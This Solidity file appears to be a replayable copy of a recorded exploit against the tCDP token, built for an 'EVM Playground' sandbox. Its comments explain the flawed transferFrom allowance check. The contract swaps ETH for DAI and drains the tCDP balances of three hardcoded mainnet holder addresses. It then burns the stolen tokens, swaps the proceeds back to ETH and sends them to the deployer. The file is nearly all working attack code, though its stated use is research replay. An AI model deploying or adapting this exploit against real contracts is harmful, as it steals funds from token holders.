// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground — a faithful copy of
// TCDPDrainAttack from evm-hack-registry/2025-04-tcdp_exp/test/tcdp_exp.sol,
// with one change needed only to make it replayable by the recorder:
//
// The original constructor is `payable` and receives `{value: 0.1 ether}` at
// deploy time (`new TCDPDrainAttack{value: 0.1 ether}(payable(address(this)))`),
// but the recorder's deploy call never carries msg.value. Here the constructor
// takes no arguments and hardcodes `profitReceiver` to `msg.sender` (the
// deployer) — matching the original exactly, since the deployer (the test
// contract there, `attacker` in the config here) IS the profit receiver — and
// the starting 0.1 ether (plus a small dust adjustment, see the config's
// `setup` comment) is funded via a pre-attack `setup.steps` rawCall to this
// contract's address instead of at deploy time. `run()` only reads
// `address(this).balance` when it starts, so funding it any time before the
// call — via setup rather than at construction — is behaviorally identical.
//
// All addresses, call sequence, and logic are otherwise copied verbatim from
// the original test file.
//
// Root cause (see test/tcdp_exp.sol header): tCDP's transferFrom() subtracts
// from `_allowed[msg.sender][to]` instead of checking `_allowed[from][msg.sender]`
// — i.e. it checks/decrements the CALLER's self-approval to the recipient,
// not the token owner's approval of the caller. So any caller that has
// approved ANY spender for itself (msg.sender's own allowance record, not the
// owner's) can pull tokens FROM an arbitrary `from` address with no real
// approval from that address at all.

address constant TCDP_TOKEN = 0xda4C9Ee8373Fd1095379a3Dd457A0c78968aAF03;
address constant HOLDER_ONE = 0x5380E20f0bEc4DCf8090Fb2dA0FdC4FE7a6bc023;
address constant HOLDER_TWO = 0x1D075f1F543bB09Df4530F44ed21CA50303A65B2;
address constant HOLDER_THREE = 0x27f735fEdC57fc1682104d40455d14FB93B21B0c;
address constant DAI_TOKEN = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
address constant WETH_TOKEN = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
address constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

interface ITCDP {
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function balanceOf(address owner) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function burn(uint256 amount) external;
    function isCompound() external view returns (bool);
}

interface IUniswapV2Router {
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract TCDPDrainExploit {
    address payable private immutable profitReceiver;

    receive() external payable {}

    constructor() {
        profitReceiver = payable(msg.sender);
    }

    function run() external {
        address[] memory buyPath = new address[](2);
        buyPath[0] = WETH_TOKEN;
        buyPath[1] = DAI_TOKEN;

        IUniswapV2Router(payable(UNISWAP_V2_ROUTER))
        .swapExactETHForTokensSupportingFeeOnTransferTokens{value: address(this).balance}(
            0, buyPath, address(this), block.timestamp
        );

        IERC20(DAI_TOKEN).approve(TCDP_TOKEN, type(uint256).max);
        ITCDP(TCDP_TOKEN).approve(address(this), type(uint256).max);

        _stealHolderBalance(HOLDER_ONE);
        _stealHolderBalance(HOLDER_TWO);
        _stealHolderBalance(HOLDER_THREE);

        uint256 stolenTcdp = ITCDP(TCDP_TOKEN).balanceOf(address(this));
        ITCDP(TCDP_TOKEN).burn(stolenTcdp);

        uint256 daiRemainder = IERC20(DAI_TOKEN).balanceOf(address(this));
        IERC20(DAI_TOKEN).approve(UNISWAP_V2_ROUTER, daiRemainder);

        address[] memory sellPath = new address[](2);
        sellPath[0] = DAI_TOKEN;
        sellPath[1] = WETH_TOKEN;
        IUniswapV2Router(payable(UNISWAP_V2_ROUTER))
            .swapExactTokensForETHSupportingFeeOnTransferTokens(
                daiRemainder, 0, sellPath, profitReceiver, block.timestamp
            );

        (bool ok,) = profitReceiver.call{value: address(this).balance}("");
        require(ok, "profit transfer failed");
    }

    function _stealHolderBalance(address holder) private {
        uint256 holderBalance = ITCDP(TCDP_TOKEN).balanceOf(holder);
        ITCDP(TCDP_TOKEN).transferFrom(holder, address(this), holderBalance);
    }
}
